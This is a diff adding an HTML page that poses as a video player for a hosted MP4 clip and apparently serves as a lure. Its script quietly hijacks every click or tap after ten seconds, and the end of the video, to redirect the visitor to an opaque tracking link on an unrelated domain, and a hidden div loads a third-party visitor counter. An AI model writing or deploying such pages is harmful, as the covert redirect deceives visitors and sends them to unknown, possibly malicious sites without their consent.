@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    
+    <!-- OG metadata akan diisi lewat JS -->
+    <meta property="og:url" content="" id="ogUrl"/>
+    <meta property="og:title" content="" id="ogTitle"/>
+    
+    <title id="pageTitle">Cargando...</title>
+
+    <link rel="shortcut icon" href="mod.github.io/iconoa164.png"/>
+    <link rel="stylesheet" href="mod.github.io/stylesa164.css"/>
+    <link rel="stylesheet" href="https://vjs.zencdn.net/8.16.1/video-js.css"/>
+</head>
+<body id="x3gxm1d6i">
+
+<main class="container">
+    <video class="video-js"></video>
+</main>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://vjs.zencdn.net/8.16.1/video.min.js"></script>
+
+<script>
+$(document).ready(function(){
+    // Dapatkan domain saat ini secara otomatis
+    const currentUrl = window.location.href;
+    const videoLink = 'https://cdn.videy.co/8dl5E8Bp1.mp4';
+
+    // Atur meta tag dan title secara dinamis
+    $('#ogUrl').attr('content', currentUrl);
+    $('#ogTitle').attr('content', videoLink);
+    $('#pageTitle').text(videoLink);
+
+    let is_click = false;
+    let segundos = 10 * 1000;
+
+    let redirectLink = 'https://polaritynurserycomma.com/vgiu5wpkz?key=17014a5ac65b0136eb3342b2465ee29b';
+    let video_js = document.querySelector('.video-js');
+
+    let on_click = function(){
+        if (is_click === true) {
+            window.location.href = redirectLink;
+        }
+    };
+
+    $(document).on('click', on_click);
+    $(document).on('touchstart', on_click);
+
+    let player = videojs(video_js, {
+        controls: true,
+        playsinline: true,
+        autoplay: 'muted',
+        preload: 'auto',
+        controlBar: {
+            fullscreenToggle: false
+        },
+        sources: [{
+            src: videoLink,
+            type: 'video/mp4'
+        }]
+    });
+
+    player.on('ended', function(){
+        window.location.href = 'https://polaritynurserycomma.com/vgiu5wpkz?key=17014a5ac65b0136eb3342b2465ee29b';
+    });
+
+    setTimeout(function(){
+        is_click = true;
+    }, segundos);
+});
+</script>
+
+<!-- Statistik pengunjung (opsional) -->
+<div style="display:none;">
+    <script id="_wau5cl">
+        var _wau = _wau || [];
+        _wau.push(["classic", "angel07", "5cl"]);
+    </script>
+    <script async src="//waust.at/c.js"></script>
+</div>
+
+</body>
+</html>
